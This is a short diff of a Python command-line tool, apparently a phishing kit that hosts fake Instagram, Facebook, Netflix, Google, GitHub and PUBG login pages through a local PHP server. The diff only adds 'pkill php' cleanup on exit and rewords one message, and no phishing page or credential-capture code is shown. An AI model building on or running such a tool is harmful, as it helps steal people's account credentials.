@@ -208,6 +208,7 @@ def instagram():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 
@@ -310,6 +311,7 @@ def facebook():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
   
 #option 3 ====================================================================================================
@@ -412,6 +414,7 @@ def netflix():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 
@@ -516,6 +519,7 @@ def Google():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
    
 #option 5 ====================================================================================================
@@ -621,6 +625,7 @@ def Github():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 #option 6 ====================================================================================================
@@ -723,6 +728,7 @@ def Pubg():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
+        subprocess.call("pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     
 #Run functions ====================================================================================================
@@ -734,7 +740,7 @@ if ask == "00":
         path_app = os.getcwd()
         subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")
     else:
-        print(f"{Fore.RED}[-] {Fore.BLUE}Sorry this option wont work on your device" + Fore.RESET)
+        print(f"\n{Fore.RED}[-] {Fore.BLUE}Sorry this option is not working on your device" + Fore.RESET)
 if ask == "1":
     instagram()
 
